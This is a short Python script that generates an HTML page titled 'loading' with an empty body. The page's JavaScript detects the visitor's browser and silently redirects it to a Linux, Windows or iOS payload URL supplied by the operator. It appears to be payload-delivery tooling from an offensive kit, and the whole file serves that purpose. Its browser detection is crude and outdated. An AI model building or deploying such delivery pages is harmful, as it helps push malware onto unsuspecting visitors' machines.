#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Created on Thu Apr  4 15:01:01 2013

@author: claes
"""
#+quote+""+linux_payload+""+quote+
def config_payload(linux_payload,windows_payload,ios_payload):
    quote = '"'
    print ">generating configuration for the payloads"
    file = open("payload_platform_config.html", "w")
    html_source = ("""<html>
<head>
<title>loading</Title>
<Script Language="JavaScript">


browsername=navigator.appName;
if (browsername.indexOf("Netscape")!=-1) {browsername="NS"}
else
{if (browsername.indexOf("Microsoft")!=-1) {browsername="MSIE"}
else {browsername="N/A"}};

//detect the browserversion
browserversion="0";
if (navigator.appVersion.indexOf("2.")!=-1) {browserversion="2"};
if (navigator.appVersion.indexOf("3.")!=-1) {browserversion="3"};
if (navigator.appVersion.indexOf("4.")!=-1) {browserversion="4"};
if (navigator.appVersion.indexOf("5.")!=-1) {browserversion="5"};
if (navigator.appVersion.indexOf("6.")!=-1) {browserversion="6"};

// Send visitor to relevant pages
if (browsername=="NS") {window.location="""+quote+""+linux_payload+""+quote+"""};
if (browsername=="MSIE"){
  if (browserversion<4){window.location="""+quote+""+windows_payload+""+quote+"""}
  else {window.location="""+quote+""+windows_payload+""+quote+"""}
}
if (browsername=="N/A") {window.location="""+quote+""+ios_payload+""+quote+"""};
</script>
</head>

<body>
</body>
</html>
""")

    file.writelines(html_source)
    file.close()
    print ">done"

